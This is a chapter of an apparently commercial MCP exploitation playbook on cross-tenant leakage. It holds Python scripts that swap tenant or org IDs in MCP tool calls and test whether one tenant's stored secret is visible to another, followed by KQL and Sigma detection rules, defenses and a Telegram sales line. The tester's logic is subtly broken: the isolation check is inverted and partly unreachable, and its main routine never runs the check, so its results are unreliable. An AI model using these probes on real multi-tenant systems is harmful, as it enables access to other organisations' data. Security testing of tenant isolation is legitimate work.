# Chapter 08 — Cross-Tenant Leakage
## The 9099 Files — MCP Exploitation Playbook

---

## What It Is

Multi-tenant MCP deployments serve multiple users or organizations from the same infrastructure. When tenant isolation is broken, data from one tenant leaks into another. A user in Tenant A can see Tenant B's files, queries, results, or credentials.

This is the cloud security problem applied to AI agents. The MCP server is the multi-tenant environment. The model context is the shared resource. If tenant boundaries in the context are not enforced, data bleeds across.

---

## Why This Works

MCP tools with shared resources — a shared database, shared file storage, shared model context sessions — require strict isolation. When a tool reads from a shared location and the tenant identifier is derived from user input rather than server-side session context, an attacker can manipulate the tenant identifier to read from another tenant's data.

Common failure points:
- File paths derived from user-supplied tenant IDs: `/{tenant_id}/files/`
- Database queries where tenant ID is user input: `SELECT * FROM files WHERE org = '{tenant}'`
- Shared model sessions where context is not cleared between users
- Caching layers that serve data to the wrong tenant

---

## The Attack

### Step 1 — Identify Tenant Isolation Points

```python
#!/usr/bin/env python3
"""
MCP Cross-Tenant Leakage Tester
Tests whether tenant isolation can be bypassed
"""
import requests
import json
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"

def test_tenant_isolation(target, tool_name, base_args, tenant_arg_name):
    """Test if manipulating tenant ID returns another tenant's data"""
    
    # Normal tenant
    normal_args = base_args.copy()
    normal_args[tenant_arg_name] = "tenant_a"
    normal_payload = {
        "jsonrpc": "2.0", "id": 1, "method": "tools/call",
        "params": {"name": tool_name, "arguments": normal_args}
    }
    
    # Try to access tenant_b's data
    leak_args = base_args.copy()
    leak_args[tenant_arg_name] = "tenant_b"
    leak_payload = {
        "jsonrpc": "2.0", "id": 2, "method": "tools/call",
        "params": {"name": tool_name, "arguments": leak_args}
    }
    
    try:
        r_normal = requests.post(f"{target}/mcp/call", json=normal_payload, timeout=10)
        r_leak = requests.post(f"{target}/mcp/call", json=leak_payload, timeout=10)
        
        normal_result = r_normal.json()
        leak_result = r_leak.json()
        
        # Check if we got different data
        if json.dumps(normal_result) != json.dumps(leak_result):
            return "ISOLATED"  # Normal behavior
        elif leak_result != normal_result:
            return "POSSIBLE_LEAK"
        else:
            return "SAME_DATA"
    except Exception as e:
        return f"ERROR: {e}"

def enumerate_tenant_tools(target):
    """Find tools that take tenant identifiers"""
    try:
        r = requests.get(f"{target}/.well-known/mcp.json", timeout=5)
        tools = r.json().get('tools', [])
    except:
        return []
    
    tenant_tools = []
    for tool in tools:
        tname = tool.get('name', '')
        tparams = json.dumps(tool.get('parameters', {}))
        # Look for tenant/org/user identifiers in parameters
        if any(x in tparams.lower() for x in ['tenant', 'org', 'organization', 'account', 'user_id']):
            tenant_tools.append(tool)
    
    return tenant_tools

def main():
    print(f"[*] MCP Cross-Tenant Leakage Tester")
    print(f"[*] Target: {TARGET}\n")
    
    tools = enumerate_tenant_tools(TARGET)
    
    if not tools:
        print("[-] No obvious tenant-scoped tools found via enumeration")
        print("[*] Manual check: look for tools with tenant_id, org, account in their parameters")
    else:
        print(f"[!] Found {len(tools)} tools with tenant/organization parameters")
        for t in tools:
            print(f"  - {t['name']}: {json.dumps(t.get('parameters', {}))[:200]}")

if __name__ == "__main__":
    main()
```

### Step 2 — Test Context Bleeding

```python
def test_context_bleeding(target):
    """
    Test if previous tenant's context bleeds into current session.
    This is for shared-session MCP deployments.
    """
    print("[*] Testing context bleeding between sessions...")
    
    # Create session as tenant_a and store sensitive data
    sess_a = requests.post(f"{target}/mcp/session", json={
        "tenant": "tenant_a",
        "session_id": "a1b2c3"
    }).json()
    
    # Store something
    requests.post(f"{target}/mcp/call", json={
        "method": "tools/call",
        "params": {
            "name": "memory_store",
            "arguments": {"key": "secret_data", "value": "TENANT_A_SUPER_SECRET"}
        }
    }, headers={"Authorization": f"Bearer {sess_a.get('token')}"})
    
    # Create session as tenant_b
    sess_b = requests.post(f"{target}/mcp/session", json={
        "tenant": "tenant_b", 
        "session_id": "x1y2z3"
    }).json()
    
    # Try to retrieve tenant_a's stored data
    result = requests.post(f"{target}/mcp/call", json={
        "method": "tools/call",
        "params": {
            "name": "memory_retrieve",
            "arguments": {"key": "secret_data"}
        }
    }, headers={"Authorization": f"Bearer {sess_b.get('token')}"})
    
    response = result.json()
    if "TENANT_A_SUPER_SECRET" in json.dumps(response):
        print("[!] CONTEXT BLEEDING CONFIRMED: tenant_b can see tenant_a's data")

if __name__ == "__main__":
    test_context_bleeding(TARGET)
```

---

## Real Case

**Multi-tenant SaaS with shared database**

A SaaS MCP platform serves multiple enterprise clients. Each client has their own data in a shared PostgreSQL database, distinguished by `org_id`. The file read tool takes a `path` argument but the SQL query uses `WHERE org_id = '{user_provided_org}'`. An attacker in Org A provides `org_id = 'org_b'` as their path parameter. The query returns Org B's files.

This was a real vulnerability class in several multi-tenant SaaS platforms in 2023-2024.

---

## Detection Rules

### KQL

```kql
MCP_ToolInputs
| where Arguments contains "tenant_b"
    or Arguments contains "org_2"
    or Arguments contains "another_org"
| project TimeGenerated, UserID, Arguments, ToolName
| where UserID != Arguments  // User ID doesn't match the org they're querying
```

### Sigma

```yaml
title: MCP Cross-Tenant Access Attempt
log_source: mcp_server
detection:
  selection:
    event.type: tool_call
    arguments|contains:
      - tenant_
      - org_2
      - org_3
      - guest_org
  condition: selection
level: critical
```

---

## Defenses

1. **Tenant ID from server-side session, never from user input** — The MCP server must resolve tenant ID from the authenticated session. Never accept a tenant ID as a tool argument or parameter. The server knows who you are from the auth token.

2. **Enforce strict session isolation** — Each tenant session gets its own model context, its own memory store, its own file namespace. No shared memory between sessions.

3. **Row-level database security** — Use database-level RLS (Row-Level Security) in PostgreSQL or equivalent. Even if the application code is wrong, the database blocks cross-tenant access.

4. **Test isolation explicitly** — Write integration tests that attempt cross-tenant access. If a test passes, the isolation is confirmed. Run them in CI.

5. **Audit all cross-tenant queries** — Log every tool call that accesses another tenant's data. Any successful cross-tenant read is a breach.

---

**$29 USDT — Full Playbook with 10 Chapters**

TX hash to `@hunnidinnit` on Telegram.